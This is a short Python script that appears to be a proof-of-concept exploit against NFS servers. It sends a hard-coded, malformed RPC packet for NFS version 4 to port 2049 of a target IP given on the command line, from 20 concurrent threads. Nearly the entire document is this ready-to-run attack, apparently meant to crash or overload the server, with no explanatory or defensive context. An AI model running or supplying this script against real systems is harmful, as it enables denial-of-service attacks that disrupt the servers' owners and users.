import socket, sys
import threading

if len(sys.argv) < 2:
    print(f"Usage: python {sys.argv[0]} IP")
    exit(0)

PAYLOAD = bytes.fromhex("80000080123456780000000000000002000186a300000004000000010000000100000014000000010000000000000000000000000000000000000000000000000000000000000000000000020000001800000022ffffffffffffffffffffffffffffffff000000030000000000000000001000000000000c000000000000000000000000")
TARGET = sys.argv[1]

def send_payload(target_ip: str, packet: bytes):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, 2049))
    s.sendall(packet)
    s.settimeout(1)
    try:
        s.recv(1024)
    except socket.timeout:
        pass
    s.close()


for i in range(20):
    print(f"Starting thread {i}")
    threading.Thread(target=send_payload, args=(TARGET, PAYLOAD)).start()